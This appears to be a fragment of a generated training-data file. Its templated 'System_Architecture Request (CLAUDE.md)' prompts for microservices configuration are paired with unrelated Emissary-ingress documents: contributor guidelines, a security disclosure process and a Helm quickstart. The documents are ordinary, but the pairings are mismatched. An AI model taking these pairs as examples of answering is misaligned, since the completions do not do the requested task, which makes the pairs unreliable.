a bug fix for CRD round trip conversion for AuthService, which is affecting both `v2.y` and `v3.y`.\n\nFirst within the issue we should discuss what versions we want to target. This can depend on current cycle work and any upcoming releases we may have.\n\nThe general rules we follow are:\n\n1. land patch in \"next\" version which is `master`\n2. backport patch to any `release/v{major}.{minor}` branches\n\nSo, let's say we discuss it and say that the \"next\" major version is a long ways away so we want to do a z patch release on our current minor version(`v3.2`) and we also want to do a z patch release on our last supported major version (`v2.4`).\n\nThis means that these patches need to land in three separate branches:\n\n1. `master` - next release\n2. `release/v3.2` - patch release\n3. `release/v2.4` - patch release\n\nIn this scenario, we first ask you to land the patch in the `master` branch and then provide separate PR's with the commits backported onto the `release/v*` branches.\n\n> Recommendation: using the `git cherry-pick -x` will add the source commit sha to the commit message. This helps with tracing work back to the original commit.\n\n#### What if my patch is only for a previous supported version?\n\nAlthough, this should be an edge case, it does happen where the code has diverged enough that a fix may only be relevant to an existing supported version. In these cases we may need to do a patch release for that older supported version.\n\nA good example, if we were to find a bug in the Envoy v2 protocol configuration we would only want to target the v2 release.\n\nIn this scenario, the base branch that we would create our feature branch off from would be the latest `minor` version for that release. As of writing this, that would be the `release/v2.4` branch. We would **not** need to target master.\n\nBut, let's say during our fix we notice other things that need to be addressed that would also need to be fixed in `master`. Then you need to submit a **separate Pull Request** that should first land on master and then follow the normal backporting process for the other patches.\n\n#### What if I'm still not sure?\n\nThis is what the issue discussions and disucssion in Slack are for so that we can help guide you so feel free to ping us in the `#emissary-dev` channel on Slack to discuss directly with us.\n\n### Merge Strategy\n\n> The audience for this section is the Maintainers but also beneficial for Contributors so that they are familiar with how the project operates.\n\nHaving a clean linear commit history for a repository makes it easier to understand what is being changed and reduces the mental load for new comers to the project.\n\nTo maintain a clean linear commit history the following rules should be followed:\n\nFirst, always rebase patch branch on to base branch. This means **NO** merge commits from merging base branch into the patch branch. This can be accomplished using git rebase.\n\n```shell\n# first, make sure you pull latest upstream changes\ngit fetch upstream\ngit checkout master\ngit pull -ff upstream/master\n\n# checkout patch branch and rebase interactive\n# you may have merge conflicts you need to resolve\ngit checkout my-patch-branch\ngit rebase -i master\n```\n\n> Note: this does rewrite your commit shas so be aware when sharing branches with co-workers.\n\nOnce the Pull Request is reviewed and has **two approvals** then a Maintainer can merge. Maintainers should follow prefer the following merge strategies:\n\n1. rebase and merge\n2. squash merge\n\nWhen `rebase and merge` is used your commits are played on top of the base branch so that it creates a clean linear history. This will maintain all the commits from the Pull Request. In most cases this should be the **preferred** merge strategy.\n\nWhen a Pull Request has lots of fixup commits, or pr feedback fixes then you should ask the Contributor to squash them as part of the PR process.\n\nIf the contributor is unable to squash them then using a `squash merge` in some cases makes sense. **IMPORTANT**, when this does happen it is important that the commit messages are cleaned up and not just blindly accepted the way proposed by Github. Since it is easy to miss that cleanup step, this should be used less frequently compared to `rebase and merge`.\n\n#### What about merge commit strategy?\n\n> The audience for this section is the Maintainers but also beneficial for Contributors so that they are familiar with how the project operates.\n\nWhen maintaining a linear commit history, each commit tells the story of what was changed in the repository. When using `merge commits` it\nadds an additional commit to the history that is not necessary because the commit history and PR history already tell the story.\n\nNow `merge commits` can be useful when you are concerned with not rewriting the commit sha. Based on the current release process which includes using `rel/v` branches that are tagged and merged into `release/v` branches we must use a `merge commit` when merging these branches. This ensures that the commit sha a Git Tag is pointing at still exists once merged into the `release/v` branch.\n\n## Contributing to the Docs\n\nThe Emissary-ingress community will all benefit from having documentation that is useful and correct. If you have found an issue with the end user documentation, then please help us out by submitting an issue and/or pull request with a fix!\n\nThe end user documentation for Emissary-ingress lives in a different repository and can be found at <https://github.com/datawire/ambassador-docs>.\n\nSee this repository for details on how to contribute to either a `pre-release` or already-released version of Emissary-ingress.\n\n## Advanced Topics\n\nThis section is for more advanced topics that provide more detailed instructions. Make sure you go through the Development Setup and read the Architecture document before exploring these topics.\n\n### Running Emissary-ingress internals locally\n\nThe main entrypoint is written in go. It strives to be as compatible as possible\nwith the normal go toolchain. You can run it with:\n\n```bash\ngo run ./cmd/busyambassador entrypoint\n```\n\nOf course just because you can run it this way does not mean it will succeed.\nThe entrypoint needs to launch `diagd` and `envoy` in order to function, and it\nalso expect to be able to write to the `/ambassador` directory.\n\n#### Setting up diagd\n\nIf you want to hack on diagd, its easiest to setup a virtualenv with an editable\ncopy and launch your `go run` from within that virtualenv. Note that these\ninstructions depend on the virtualenvwrapper\n(<https://virtualenvwrapper.readthedocs.io/en/latest/>) package:\n\n```bash\n# Create a virtualenv named venv with all the python requirements\n# installed.\npython3 -m venv venv\n. venv/bin/activate\n# If you're doing this in Datawire's apro.git, then:\ncd ambassador\n# Update pip and install dependencies\npip install --upgrade pip\npip install orjson    # see below\npip install -r builder/requirements.txt\n# Created an editable installation of ambassador:\npip install -e python/\n# Check that we do indeed have diagd in our path.\nwhich diagd\n# If you're doing this in Datawire's apro.git, then:\ncd ..\n```\n\n(Note: it shouldn't be necessary to install `orjson` by hand. The fact that it is\nat the moment is an artifact of the way Ambassador builds currently happen.)\n\n#### Changing the ambassador root\n\nYou should now be able to launch ambassador if you set the\n`ambassador_root` environment variable to a writable location:\n\n   ambassador_root=/tmp go run ./cmd/busyambassador entrypoint\n\n#### Getting envoy\n\nIf you do not have envoy in your path already, the entrypoint will use\ndocker to run it.\n\n#### Shutting up the pod labels error\n\nAn astute observe of the logs will notice that ambassador complains\nvociferously that pod labels are not mounted in the ambassador\ncontainer. To reduce this noise, you can:\n\n```bash\nmkdir /tmp/ambassador-pod-info && touch /tmp/ambassador-pod-info/labels\n```\n\n#### Extra credit\n\nWhen you run ambassador locally it will configure itself exactly as it\nwould in the cluster. That means with two caveats you can actually\ninteract with it and it will function normally:\n\n1. You need to run `telepresence connect` or equivalent so it can\n   connect to the backend services in its configuration.\n\n2. You need to supply the host header when you talk to it.\n\n### Debugging and Developing Envoy Configuration\n\nEnvoy configuration is generated by the ambassador compiler. Debugging\nthe ambassador compiler by running it in kubernetes is very slow since\nwe need to push both the code and any relevant kubernetes resources\ninto the cluster. The following sections will provide tips for improving\nthis development experience.\n\n### Making changes to Envoy\n\nEmissary-ingress is built on top of Envoy and leverages a vendored version of Envoy (*we track upstream very closely*). This section will go into how to make changes to the Envoy that is packaged with Emissary-ingress.\n\nThis is a bit more complex than anyone likes, but here goes:\n\n#### 1. Preparing your machine\n\nBuilding and testing Envoy can be very resource intensive.  A laptop\noften can build Envoy... if you plug in an external hard drive, point\na fan at it, and leave it running overnight and most of the next day.\nAt Ambassador Labs, we'll often spin up a temporary build machine in GCE, so\nthat we can build it very quickly.\n\nAs of Envoy 1.15.0, we've measure the resource use to build and test\nit as:\n\n> | Command            | Disk Size | Disk Used | Duration[1] |\n> |--------------------|-----------|-----------|-------------|\n> | `make update-base` | 450G      |  12GB     | ~11m        |\n> | `make check-envoy` | 450G      | 424GB     | ~45m        |\n>\n> [1] On a \"Machine type: custom (32 vCPUs, 512 GB memory)\" VM on GCE,\n> with the following entry in its `/etc/fstab`:\n>\n> ```bash\n> tmpfs:docker  /var/lib/docker  tmpfs  size=450G  0  0\n> ```\n\nIf you have the RAM, we've seen huge speed gains from doing the builds\nand tests on a RAM disk (see the `/etc/fstab` line above).\n\n#### 2. Setting up your workspace to hack on Envoy\n\n1. From your `emissary.git` checkout, get Emissary-ingress's current\n   version of the Envoy sources, and create a branch from that:\n\n   ```shell\n   make $PWD/_cxx/envoy\n   git -C _cxx/envoy checkout -b YOUR_BRANCHNAME\n   ```\n2. To build Envoy in FIPS mode, set the following variable:\n\n   ```shell\n   export FIPS_MODE=true\n   ```\n\n   It is important to note that while building Envoy in FIPS mode is\n   required for FIPS compliance, additional steps may be necessary.\n   Emissary does not claim to be FIPS compliant or certified.\n   See [here](https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/security/ssl#fips-140-2) for more information on FIPS and Envoy.\n\n> _NOTE:_ FIPS_MODE is NOT supported by the emissary-ingress maintainers but we provide this for developers as convience\n\n#### 3. Hacking on Envoy\n\nModify the sources in `./_cxx/envoy/`. or update the branch and/or `ENVOY_COMMIT` as necessary in `./_cxx/envoy.mk`\n\n#### 4. Building and testing your hacked-up Envoy\n\n> See `./_cxx/envoy.mk` for the full list of targets.\n\nMultiple Phony targets are provided so that developers can run the steps they are interested in when developing, here are few of the key ones:\n\n- `make update-base`: will perform all the steps necessary to verify, build envoy, build docker images, push images to the container repository and compile the updated protos.\n\n- `make build-envoy`: will build the envoy binaries using the same build container as the upstream Envoy project. Build outputs are mounted to the  `_cxx/envoy-docker-build` directory and Bazel will write the results there.\n\n- `make build-base-envoy-image`: will use the release outputs from building envoy to generate a new `base-envoy` container which is then used in the main emissary-ingress container build.\n\n- `make push-base-envoy`: will push the built container to the remote container repository.\n\n- `make check-envoy`: will use the build docker container to run the Envoy test suite against the currently checked out envoy in the `_cxx/envoy` folder.\n\n- `make envoy-shell`: will run the envoy build container and open a bash shell session. The `_cxx/envoy` folder is volume mounted into the container and the user is set to the `envoybuild` user in the container to ensure you are not running as root to ensure hermetic builds.\n\n#### 5. Test Devloop\n\nRunning the Envoy test suite will compile all the test targets. This is a slow process and can use lots of disk space.\n\nThe Envoy Inner Devloop for build and testing:\n\n- You can make a change to Envoy code and run the whole test by just calling `make check-envoy`\n- You can run a specific test instead of the whole test suite by setting the `ENVOY_TEST_LABEL` environment variable.\n  - For example, to run just the unit tests in `test/common/network/listener_impl_test.cc`, you should run:\n\n   ```shell\n   ENVOY_TEST_LABEL='//test/common/network:listener_impl_test' make check-envoy\n   ```\n\n- Alternatively, you can run `make envoy-shell` to get a bash shell into the Docker container that does the Envoy builds and you are free to interact with `Bazel` directly.\n\nInterpreting the test results:\n\n- If you see the following message, don't worry, it's harmless; the tests still ran:\n\n   ```text\n   There were tests whose specified size is too big. Use the --test_verbose_timeout_warnings command line option to see which ones these are.\n   ```\n\n   The message means that the test passed, but it passed too\n   quickly, and Bazel is suggesting that you declare it as smaller.\n   Something along the lines of \"This test only took 2s, but you\n   declared it as being in the 60s-300s ('moderate') bucket,\n   consider declaring it as being in the 0s-60s ('short')\n   bucket\".\n\n   Don't be confused (as I was) in to thinking that it was saying\n   that the test was too big and was skipped and that you need to\n   throw more hardware at it.\n\n- **Build or test Emissary-ingress** with the usual `make` commands, with\n  the exception that you MUST run `make update-base` first whenever\n  Envoy needs to be recompiled; it won't happen automatically.  So\n  `make test` to build-and-test Emissary-ingress would become\n  `make update-base && make test`, and `make images` to just build\n  Emissary-ingress would become `make update-base && make images`.\n\nThe Envoy changes with Emissary-ingress:\n\n- Either run `make update-base` to build, and push a new base container and then you can run `make test` for the Emissary-ingress test suite.\n- If you do not want to push the container you can instead:\n  - Build Envoy - `make build-envoy`\n  - Build container - `make build-base-envoy-image`\n  - Test Emissary - `make test`\n\n#### 6. Protobuf changes\n\nIf you made any changes to the Protocol Buffer files or if you bumped versions of Envoy then you\nshould make sure that you are re-compiling the Protobufs so that they are available and checked-in\nto the emissary.git repository.\n\n```sh\nmake compile-envoy-protos\n```\n\nThis will copy over the raw proto files, compile and copy the generated go code over to emisary-ignress repository.\n\n#### 7. Finalizing your changes\n\n> NOTE: we are no longer accepting PR's in `datawire/envoy.git`.\n\nIf you have custom changes then land them in your custom envoy repository and update the `ENVOY_COMMIT` and `ENVOY_DOCKER_REPO` variable in `_cxx/envoy.mk` so that the image will be pushed to the correct repository.\n\nThen run `make update-base` does all the bits so assuming that was successful then are all good.\n\n**For maintainers:**\n\nYou will want to make sure that the image is pushed to the backup container registries:\n\n```shell\n# upload image to the mirror in GCR\nSHA=GET_THIS_FROM_THE_make_update-base_OUTPUT\nTAG=\"envoy-0.$SHA.opt\"\ndocker pull \"docker.io/emissaryingress/base-envoy:envoy-0.$TAG.opt\"\ndocker tag \"docker.io/emissaryingress/base-envoy:$TAG\" \"gcr.io/datawire/ambassador-base:$TAG\"\ndocker push \"gcr.io/datawire/ambassador-base:$TAG\"\n```\n\n#### 8. Final Checklist\n\n**For Maintainers Only**\n\nHere is a checklist of things to do when bumping the `base-envoy` version:\n\n- [ ] The image has been pushed to...\n  - [ ] `docker.io/emissaryingress/base-envoy`\n  - [ ] `gcr.io/datawire/ambassador-base`\n- [ ] The `datawire/envoy.git` commit has been tagged as `datawire-$(git describe --tags --match='v*')`\n      (the `--match` is to prevent `datawire-*` tags from stacking on each other).\n- [ ] It's been tested with...\n  - [ ] `make check-envoy`\n\nThe `check-envoy-version` CI job will double check all these things, with the exception of running\nthe Envoy tests. If the `check-envoy-version` is failing then double check the above, fix them and\nre-run the job.\n\n### Developing Emissary-ingress (Maintainers-only advice)\n\nAt the moment, these techniques will only work internally to Maintainers. Mostly\nthis is because they require credentials to access internal resources at the\nmoment, though in several cases we're working to fix that.\n\n#### Updating license documentation\n\nWhen new dependencies are added or existing ones are updated, run\n`make generate` and commit changes to `DEPENDENCIES.md` and\n`DEPENDENCY_LICENSES.md`\n\n#### Upgrading Python dependencies\n\nDelete `python/requirements.txt`, then run `make generate`.\n\nIf there are some dependencies you don't want to upgrade, but want to\nupgrade everything else, then\n\n 1. Remove from `python/requirements.txt` all of the entries except\n    for those you want to pin.\n 2. Delete `python/requirements.in` (if it exists).\n 3. Run `make generate`.\n\n> **Note**: If you are updating orjson you will need to also update `docker/base-python/Dockerfile` before running `make generate` for the new version. orjson uses rust bindings and the default wheels on PyPI rely on glibc. Because our base python image is Alpine based, it is built from scratch using rustc to build a musl compatable version.\n\n > :warning: You may run into an error when running `make generate` where it can't detect the licenses for new or upgraded dependencies, which is needed so that so that we can properly generate DEPENDENCIES.md and DEPENDENCY_LICENSES.md. If that is the case, you may also have to update `build-aux/tools/src/py-mkopensource/main.go:parseLicenses` for any license changes then run `make generate` again.\n\n## FAQ\n\nThis section contains a set of Frequently Asked Questions that may answer a question you have. Also, feel free to ping us in Slack.\n\n### How do I find out what build targets are available?\n\nUse `make help` and `make targets` to see what build targets are\navailable along with documentation for what each target does.\n\n### How do I develop on a Mac with Apple Silicon?\n\nTo ensure that developers using a Mac with Apple Silicon can contribute, the build system ensures\nthe build artifacts are `linux/amd64` rather than the host architecture. This behavior can be overriden\nusing the `BUILD_ARCH` environment variable (e.g. `BUILD_ARCH=linux/arm64 make images`).\n\n### How do I develop on Windows using WSL?\n\n- [WSL 2](https://learn.microsoft.com/en-us/windows/wsl/)\n- [Docker Desktop for Windows](https://docs.docker.com/desktop/windows/wsl/)\n- [VS Code](https://code.visualstudio.com/)\n\n### How do I test using a private Docker repository?\n\nIf you are pushing your development images to a private Docker repo,\nthen:\n\n```sh\nexport DEV_USE_IMAGEPULLSECRET=true\nexport DOCKER_BUILD_USERNAME=...\nexport DOCKER_BUILD_PASSWORD=...\n```\n\nand the test machinery should create an `imagePullSecret` from those Docker credentials such that it can pull the images.\n\n### How do I change the loglevel at runtime?\n\n```console\ncurl localhost:8877/ambassador/v0/diag/?loglevel=debug\n```\n\nNote: This affects diagd and Envoy, but NOT the AES `amb-sidecar`.\nSee the AES `CONTRIBUTING.md` for how to do that.\n\n### Can I build from a docker container instead of on my local computer?\n\nIf you want to build within a container instead of setting up dependencies on your local machine then you can run the build within a docker container and leverage \"Docker in Docker\" to build it.\n\n1. `docker pull docker:latest`\n2. `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh`\n3. `apk add --update --no-cache bash build-base go curl rsync python3 python2 git libarchive-tools gawk jq`\n4. `git clone https://github.com/emissary-ingress/emissary.git && cd emissary`\n5. `make images`\n\nSteps 0 and 1 are run on your machine, and 2 - 4 are from within the docker container. The base image is a \"Docker in Docker\" image, ran with `-v /var/run/docker.sock:/var/run/docker.sock` in order to connect to your local daemon from the docker inside the container. More info on Docker in Docker [here](https://hub.docker.com/_/docker).\n\nThe images will be created and tagged as defined above, and will be available in docker on your local machine.\n\n### How do I clear everything out to make sure my build runs like it will in CI?\n\nUse `make clobber` to completely remove all derived objects, all cached artifacts, everything, and get back to a clean slate. This is recommended if you change branches within a clone, or if you need to `make generate` when you're not *certain* that your last `make generate` was using the same Envoy version.\n\nUse `make clean` to remove derived objects, but *not* clear the caches.\n\n### My editor is changing `go.mod` or `go.sum`, should I commit that?\n\nIf you notice this happening, run `make go-mod-tidy`, and commit that.\n\n(If you're in Ambassador Labs, you should do this from `apro/`, not\n`apro/ambassador/`, so that apro.git's files are included too.)\n\n### How do I debug \"This should not happen in CI\" errors?\n\nThese checks indicate that some output file changed in the middle of a\nrun, when it should only change if a source file has changed.  Since\nCI isn't editing the source files, this shouldn't happen in CI!\n\nThis is problematic because it means that running the build multiple\ntimes can give different results, and that the tests are probably not\ntesting the same image that would be released.\n\nThese checks will show you a patch showing how the output file\nchanged; it is up to you to figure out what is happening in the\nbuild/test system that would cause that change in the middle of a run.\nFor the most part, this is pretty simple... except when the output\nfile is a Docker image; you just see that one image hash is different\nthan another image hash.\n\nFortunately, the failure showing the changed image hash is usually\nimmediately preceded by a `docker build`.  Earlier in the CI output,\nyou should find an identical `docker build` command from the first time it\nran.  In the second `docker build`'s output, each step should say\n`---> Using cache`; the first few steps will say this, but at some\npoint later steps will stop saying this; find the first step that is\nmissing the `---> Using cache` line, and try to figure out what could\nhave changed between the two runs that would cause it to not use the\ncache.\n\nIf that step is an `ADD` command that is adding a directory, the\nproblem is probably that you need to add something to `.dockerignore`.\nTo help figure out what you need to add, try adding a `RUN find\nDIRECTORY -exec ls -ld -- {} +` step after the `ADD` step, so that you\ncan see what it added, and see what is different on that between the\nfirst and second `docker build` commands.\n\n### How do I run Emissary-ingress tests?\n\n- `export DEV_REGISTRY=<your-dev-docker-registry>` (you need to be logged in and have permission to push)\n- `export DEV_KUBECONFIG=<your-dev-kubeconfig>`\n\nIf you want to run the Go tests for `cmd/entrypoint`, you'll need `diagd`\nin your `PATH`. See the instructions below about `Setting up diagd` to do\nthat.\n\n| Group           | Command                                                                |\n| --------------- | ---------------------------------------------------------------------- |\n| All Tests       | `make test`                                                            |\n| All Golang      | `make gotest`                                                          |\n| All Python      | `make pytest`                                                          |\n| Some/One Golang | `make gotest GOTEST_PKGS=./cmd/entrypoint GOTEST_ARGS=\"-run TestName\"` |\n| Some/One Python | `make pytest PYTEST_ARGS=\"-k TestName\"`                                |\n\nPlease note the python tests use a local cache to speed up test\nresults. If you make a code update that changes the generated envoy\nconfiguration, those tests will fail and you will need to update the\npython test cache.\n\nNote that it is invalid to run one of the `main[Plain.*]` Python tests\nwithout running all of the other `main[Plain*]` tests; the test will\nfail to run (not even showing up as a failure or xfail--it will fail\nto run at all).  For example, `PYTEST_ARGS=\"-k WebSocket\"` would match\nthe `main[Plain.WebSocketMapping-GRPC]` test, and that test would fail\nto run; one should instead say `PYTEST_ARGS=\"-k Plain or WebSocket\"`\nto avoid breaking the sub-tests of \"Plain\".\n\n### How do I type check my python code?\n\nAmbassador uses Python 3 type hinting and the `mypy` static type checker to\nhelp find bugs before runtime. If you haven't worked with hinting before, a\ngood place to start is\n[the `mypy` cheat sheet](https://mypy.readthedocs.io/en/latest/cheat_sheet_py3.html).\n\nNew code must be hinted, and the build process will verify that the type\ncheck passes when you `make test`. Fair warning: this means that\nPRs will not pass CI if the type checker fails.\n\nWe strongly recommend using an editor that can do realtime type checking\n(at Datawire we tend to use PyCharm and VSCode a lot, but many many editors\ncan do this now) and also running the type checker by hand before submitting\nanything:\n\n- `make lint/mypy` will check all the Ambassador code\n\nAmbassador code should produce *no* warnings and *no* errors.\n\nIf you're concerned that the mypy cache is somehow wrong, delete the\n`.mypy_cache/` directory to clear the cache.\n\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "DevDocumentation/CONTRIBUTING.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 930}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Security Release Process\n\nEmissary-ingress is a large, growing community comprising maintainers, volunteers, and users.\nThe Emissary community has adopted this security disclosure and response policy to ensure we\nresponsibly handle critical issues.\n\nThis disclosure process draws heavily from that of the Envoy Proxy -- many thanks!\n\n## Emissary Security Team (EMST)\n\nSecurity vulnerabilities should be handled quickly and sometimes privately. The primary goal of this\nprocess is to reduce the total time users are vulnerable to publicly known exploits.\n\nThe Emissary Security Team (EMST) is responsible for organizing the entire response including internal\ncommunication and external disclosure but will need help from relevant developers to successfully\nrun this process.\n\nThe initial Emissary Security Team will consist of all [maintainers](../Community/MAINTAINERS.md), with communications\ninitially handled via email to [secalert@datawire.io](mailto:secalert@datawire.io). In the future,\nwe may change the membership of the EMST, or the communication mechanism.\n\n## Private Disclosure Process\n\nThe Emissary community asks that all suspected vulnerabilities be privately and responsibly disclosed\nvia email to [secalert@datawire.io](mailto:secalert@datawire.io).\n\n## Public Disclosure Processes\n\nIf you know of a publicly disclosed security vulnerability please IMMEDIATELY email\n[secalert@datawire.io](mailto:secalert@datawire.io) to inform the Emissary Security Team (EMST)\nabout the vulnerability so they may start the patch, release, and communication process.\n\nIf possible the EMST will ask the person making the public report if the issue can be handled via a\nprivate disclosure process (for example if the full exploit details have not yet been published). If\nthe reporter denies the request for private disclosure, the EMST will move swiftly with the fix and\nrelease process. In extreme cases GitHub can be asked to delete the issue but this generally isn't\nnecessary and is unlikely to make a public disclosure less damaging.\n\n## Patch, Release, and Public Communication\n\nFor each vulnerability a member of the Emissary Security Team (EMST) will volunteer to lead\ncoordination with the \"Fix Team\" and is responsible for sending disclosure emails to the rest of\nthe community. This lead will be referred to as the \"Fix Lead.\"\n\nThe role of Fix Lead should rotate round-robin across the EMST.\n\nNote that, at present, it is likely that the Fix Team and the EMST are identical (all maintainers).\nThe EMST may decide to bring in additional contributors for added expertise depending on the area\nof the code that contains the vulnerability.\n\nAll of the timelines below are suggestions and assume a private disclosure. The Fix Lead drives the\nschedule using their best judgment based on severity and development time. If the Fix Lead is\ndealing with a public disclosure all timelines become ASAP (assuming the vulnerability has a CVSS\nscore >= 4; see below). If the fix relies on another upstream project's disclosure timeline, that\nwill adjust the process as well. We will work with the upstream project to fit their timeline and\nbest protect our users.\n\n### Released versions and the `master` branch\n\nIf the vulnerability affects a supported version (typically the _most recent_ minor release, e.g.\n1.13), then the full security release process described in this document will be activated. A\npatch release will be created (e.g. 1.13.10) with the fix, and the fix will also be made on\n`master`.\n\nIf a vulnerability affects only `master`, the fix will be incorporated into the next release.\nSecurity vulnerabilities that warrant action per this process will be considered release\nblockers.\n\nIf a security vulnerability affects only unsupported versions but not `master` or a supported\nversion, no new release will be created. The vulnerability will be described as a GitHub issue,\nand a CVE will be filed if warranted by severity.\n\n### Confidentiality, integrity and availability\n\nWe consider vulnerabilities leading to the compromise of data confidentiality or integrity to be\nour highest priority concerns. Availability, in particular in areas relating to DoS and resource\nexhaustion, is also a serious security concern for Emissary operators, given Emissary's common\nplacement at the edge.\n\nIn general, we will fix well-known resource consumption issues (e.g. high CPU or memory usage) in\nthe open, using our normal process for bugfixes. We will activate the security process for\ndisclosures that appear to present a significantly higher risk profile than simple \"usage\", for\nexample:\n\n* A \"query of death\", where a single client query can crash Emissary entirely.\n* Highly asymmetric resource exhaustion attacks, where very little traffic can cause resource\n  exhaustion, e.g. that delivered by a single client.\n\nNote that while we generally consider the installation mechanisms provided by the Emissary-ingress\nproject (our published Helm charts and manifests) \"safe\", there is no way to guarantee that the\npublished installation mechanisms will always work in any specific setting. Ultimately, Emissary\noperators need to understand the impact of their own configurations, especially in larger\ninstallations.\n\n### Fix Team Organization\n\nThese steps should be completed within the first 24 hours of disclosure.\n\n- The Fix Lead will work quickly to identify relevant engineers from the affected projects and\n  packages and CC those engineers into the disclosure thread. These selected developers are the\n  Fix Team.\n- Work toward the fix will take place in private \"security repos\". The Fix Lead is responsible\n  for arranging for the Fix Team to have access to the private security repos (cf GitHub's\n  documentation on [duplicating a repository](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/duplicating-a-repository).)\n\n### Fix Development Process\n\nThese steps should be completed within the 1-7 days of Disclosure.\n\n- The Fix Lead and the Fix Team will create a\n  [CVSS](https://www.first.org/cvss/specification-document) using the [CVSS\n  Calculator](https://www.first.org/cvss/calculator/3.0). The Fix Lead makes the final call on the\n  calculated CVSS; it is better to move quickly than to spend time making the CVSS perfect.\n- The Fix Team will work per the usual [Emissary Development Process](CONTRIBUTING.md), including\n  fix branches, PRs, reviews, etc.\n- The Fix Team will notify the Fix Lead that work on the fix branch is complete once the fix is\n  present in the relevant release branch(es) in the private security repo.\n\nIf the CVSS score is under 4.0 ([a low severity score](https://www.first.org/cvss/specification-document#i5))\nthe Fix Team can decide to slow the release process down in the face of holidays, developer\nbandwidth, etc. These decisions must be discussed on the secalert mailing list.\n\n### Fix Disclosure Process\n\nWith the fix development underway, the Fix Lead needs to come up with an overall communication plan\nfor the wider community. This Disclosure process should begin after the Fix Team has developed a fix\nor mitigation so that a realistic timeline can be communicated to users.\n\n**Disclosure of Forthcoming Fix to Users** (Completed within 1-7 days of Disclosure)\n\n- The Fix Lead will announce in `#emissary` and `#general` on the [Emissary Slack](https://a8r.io/slack)\n  informing users that a security vulnerability has been disclosed and that a fix will be made\n  available at a specific date and time in the future via this list. This time is the Release Date.\n- The Fix Lead will include any mitigating steps users can take until a fix is available.\n\nThe communication to users should be actionable. They should know when to block time to apply\npatches, understand exact mitigation steps, etc.\n\n**Fix Release Day** (Completed within 1-21 days of Disclosure)\n\n- The Fix Lead will PR the fix from the private security repo into [the Emissary repo](https://github.com/emissary-ingress/emissary).\n- Maintainers will merge this PR as quickly as possible. Changes shouldn't be made to the commits even\n  for a typo in the CHANGELOG as this will change the git SHA of the commits leading to confusion and\n  potentially conflicts as the fix is cherry-picked around branches.\n- The Fix Lead will request a CVE from [DWF](https://github.com/distributedweaknessfiling/DWF-Documentation)\n  and include the CVSS and release details.\n- The Fix Lead will announce in `#emissary` and `#general` on the [Emissary Slack](https://a8r.io/slack)\n  stating the new releases, the CVE number, and the relevant merged PRs to get wide distribution and\n  user action. As much as possible this message should be actionable and include links on how to apply\n  the fix to user's environments; this can include links to external distributor documentation.\n- The Fix Lead will remove the Fix Team from the private security repo.\n\n### Retrospective\n\nThese steps should be completed 1-3 days after the Release Date. The retrospective process\n[should be blameless](https://landing.google.com/sre/book/chapters/postmortem-culture.html).\n\n- The Fix Lead will send a retrospective of the process to [secalert@datawire.io](mailto:secalert@datawire.io)\n  and to `#emissary-dev` on the [Emissary Slack](https://a8r.io/slack), giving details on everyone\n  involved, the timeline of the process, links to PRs that introduced the issue (if relevant),\n  and any critiques of the response and release process.\n- Maintainers and Fix Team are also encouraged to send their own feedback on the process to\n  [secalert@datawire.io](mailto:secalert@datawire.io), or to discuss it in `#emissary-dev`\n  on the [Emissary Slack](https://a8r.io/slack). Honest critique is the only way we will\n  improve as a community.\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "DevDocumentation/SECURITY_RELEASE_PROCESS.md", "language": "markdown", "complexity": "medium", "star_count": 4436, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 166}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Emissary-ingress 3.10 Quickstart\n\n**We recommend using Helm** to install Emissary.\n\n### Installing if you're starting fresh\n\n**If you are already running Emissary and just want to upgrade, DO NOT FOLLOW\nTHESE DIRECTIONS.** Instead, check out \"Upgrading from an earlier Emissary\"\nbelow.\n\nIf you're starting from scratch and you don't need to worry about older CRD\nversions, install using `--set enableLegacyVersions=false` to avoid install\nthe old versions of the CRDs and the conversion webhook:\n\n```bash\nhelm install emissary-crds \\\n --namespace emissary --create-namespace \\\n oci://ghcr.io/emissary-ingress/emissary-crds-chart --version=3.10.0 \\\n --set enableLegacyVersions=false \\\n --wait\n```\n\nThis will install only v3alpha1 CRDs and skip the conversion webhook entirely.\nIt will create the `emissary` namespace for you, but there won't be anything\nin it at this point.\n\nNext up, install Emissary itself, with `--set waitForApiext.enabled=false` to\ntell Emissary not to wait for the conversion webhook to be ready:\n\n```bash\nhelm install emissary \\\n --namespace emissary \\\n oci://ghcr.io/emissary-ingress/emissary-ingress --version=3.10.0 \\\n --set waitForApiext.enabled=false \\\n --wait\n```\n\n### Upgrading from an earlier Emissary\n\nFirst, install the CRDs and the conversion webhook:\n\n```bash\nhelm install emissary-crds \\\n --namespace emissary-system --create-namespace \\\n oci://ghcr.io/emissary-ingress/emissary-crds-chart --version=3.10.0 \\\n --wait\n```\n\nThis will install all the versions of the CRDs (v1, v2, and v3alpha1) and the\nconversion webhook into the `emissary-system` namespace. Once that's done, you'll install Emissary itself:\n\n```bash\nhelm install emissary \\\n --namespace emissary --create-namespace \\\n oci://ghcr.io/emissary-ingress/emissary-ingress --version=3.10.0 \\\n --wait\n```\n\n### Using Emissary\n\nIn either case above, you should have a running Emissary behind the Service\nnamed `emissary-emissary-ingress` in the 